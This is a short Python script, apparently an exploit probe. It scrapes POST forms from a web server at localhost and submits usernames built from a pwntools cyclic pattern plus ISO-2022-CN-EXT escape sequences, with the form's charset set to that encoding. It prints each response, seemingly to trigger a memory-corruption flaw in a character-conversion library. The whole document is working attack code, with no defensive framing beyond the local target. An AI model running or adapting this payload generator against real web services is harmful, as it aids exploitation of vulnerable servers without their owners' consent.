import requests
from bs4 import BeautifulSoup
from pwn import cyclic

base_url = "http://localhost/"
pattern = cyclic(1024)
escape_sequences = [b"$+I", b"$+J", b"$+K", b"$+L", b"$+M", b"$*H"]
payloads = [pattern[:i] + seq for seq in escape_sequences for i in range(100, 105)]
charset_param = 'charset'

def find_post_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'lxml')
    forms = soup.find_all('form', method='post')
    return forms

def exploit_form(form, action_url):
    inputs = form.find_all('input')
    form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
    for payload in payloads:
        form_data.update({'username': payload.decode('latin1'), 'password': 'testpassword', charset_param: 'ISO-2022-CN-EXT'})
        print(f"Trying payload of size {len(payload)} bytes")
        try:
            response = requests.post(action_url, data=form_data, timeout=10)
            print(f"Trying payload {payload} in form with action {action_url}...")
            print("Response status code:", response.status_code)
            print("Response text:", response.text)
            print("\n")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

forms = find_post_forms(base_url)
for form in forms:
    action = form.get('action')
    action_url = action if action.startswith('http') else base_url + '/' + action.lstrip('/')
    exploit_form(form, action_url)
